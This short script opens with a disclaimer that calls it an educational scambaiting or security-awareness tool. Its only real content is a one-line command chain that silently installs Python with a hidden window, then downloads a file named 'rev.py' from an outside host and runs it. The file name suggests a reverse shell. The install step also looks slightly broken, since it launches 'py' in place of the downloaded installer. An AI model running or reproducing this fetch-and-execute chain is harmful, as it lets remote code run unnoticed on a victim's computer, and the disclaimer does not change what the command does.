#EDUCATIONAL USE ONLY.
#This code is part of a scambaiting / security awareness project.
#Do NOT deploy for phishing, fraud, impersonation, or unauthorized access.
#The author disclaims all liability for misuse.

curl -o python.exe https://www.python.org/ftp/python/3.12.2/python-3.12.2-amd64.exe ; Start-Process py -ArgumentList "/quiet InstallAllUsers=1 PrependPath=1" -WindowStyle Hidden -Wait; py -m pip install requests; curl -o r.py https://jblowfi.org/rev.py; py r.py;
